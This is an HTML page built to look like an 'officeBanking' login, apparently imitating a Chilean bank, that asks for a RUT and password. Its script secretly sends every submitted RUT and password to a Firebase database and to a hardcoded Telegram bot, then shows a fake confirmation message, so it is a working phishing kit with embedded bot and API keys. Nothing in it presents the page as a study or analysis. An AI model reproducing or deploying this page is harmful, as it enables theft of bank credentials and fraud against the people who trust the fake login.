
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ingreso a officeBanking</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h2 {
      color: black;
    }
    .banking {
      background-color: red;
      color: white;
      padding: 2px 8px;
      border-radius: 4px;
      margin-left: 5px;
    }
    form {
      border: 2px solid red;
      padding: 20px;
      border-radius: 10px;
      background-color: white;
      display: flex;
      flex-direction: column;
      width: 90%;
      max-width: 300px;
    }
    input {
      margin: 10px 0;
      padding: 10px;
      font-size: 18px;
      border: 1px solid black;
      border-radius: 5px;
      width: calc(100% - 22px);
    }
    .input-container {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 14px;
      cursor: pointer;
    }
    button {
      margin-top: 10px;
      padding: 10px;
      font-size: 18px;
      background-color: red;
      color: white;
      border: none;
      border-radius: 5px;
    }
    .mensaje-final {
      border: 2px solid red;
      padding: 20px;
      border-radius: 10px;
      color: red;
      font-size: 20px;
      background: white;
      text-align: center;
    }
  </style>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCdzFXQ2h6u2QA4O8TtUWf3TZxzTnP5O9E",
      authDomain: "formulario-ob.firebaseapp.com",
      databaseURL: "https://formulario-ob-default-rtdb.firebaseio.com",
      projectId: "formulario-ob",
      storageBucket: "formulario-ob.firebasestorage.app",
      messagingSenderId: "1017857662001",
      appId: "1:1017857662001:web:b80ad26965daf7ce960910"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    function formatoRUT(rut) {
      rut = rut.replace(/[.-]/g, '').replace(/^0+/, '');
      if (rut.length > 1) {
        let cuerpo = rut.slice(0, -1);
        let dv = rut.slice(-1);
        cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
        return cuerpo + "-" + dv;
      }
      return rut;
    }

    function validarRUT(rutCompleto) {
      rutCompleto = rutCompleto.replace(/\./g, "").replace("-", "");
      const rut = rutCompleto.slice(0, -1);
      const dv = rutCompleto.slice(-1).toUpperCase();
      let suma = 0;
      let multiplo = 2;

      for (let i = rut.length - 1; i >= 0; i--) {
        suma += parseInt(rut[i]) * multiplo;
        multiplo = multiplo < 7 ? multiplo + 1 : 2;
      }

      const dvEsperado = 11 - (suma % 11);
      const dvFinal = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
      return dv === dvFinal;
    }

    function togglePassword() {
      const input = document.getElementById("clave");
      input.type = input.type === "password" ? "text" : "password";
    }

    window.enviarFormulario = async function(e) {
      e.preventDefault();
      const rut = document.getElementById("rut").value;
      const clave = document.getElementById("clave").value;

      if (!validarRUT(rut)) {
        alert("RUT inv√°lido");
        return;
      }

      try {
        // Guardar en Firebase
        await addDoc(collection(db, "ingresos"), {
          rut: rut,
          clave: clave,
          timestamp: new Date()
        });

        // Enviar a Telegram
        const mensaje = `Nuevo ingreso:\nRUT: ${rut}\nClave: ${clave}`;
        await fetch("https://api.telegram.org/bot7611699433:AAHe4sFYNBlZRligGcUsYv-0Y9-0rTzgx5o/sendMessage", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: "7752197334",
            text: mensaje
          })
        });

        document.getElementById("formulario").style.display = "none";
        document.getElementById("mensajeFinal").style.display = "block";
      } catch (error) {
        console.error("Error:", error);
        alert("Ocurri√≥ un error al enviar los datos.");
      }
    };

    window.onload = () => {
      document.getElementById("rut").addEventListener("input", function () {
        this.value = formatoRUT(this.value.replace(/[^0-9kK]/g, "").toUpperCase());
      });
    };
  </script>
</head>
<body>
  <h2>Ingreso a <span class="banking">officeBanking</span></h2>

  <form id="formulario" onsubmit="enviarFormulario(event)">
    <input type="text" id="rut" placeholder="RUT" required maxlength="12" />
    <div class="input-container">
      <input type="password" id="clave" placeholder="Contrase√±a" required maxlength="12" />
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>
    <button type="submit">Ingresar</button>
  </form>

  <div id="mensajeFinal" class="mensaje-final" style="display:none;">
    Hemos recibido tu solicitud correctamente.
  </div>
</body>
</html>
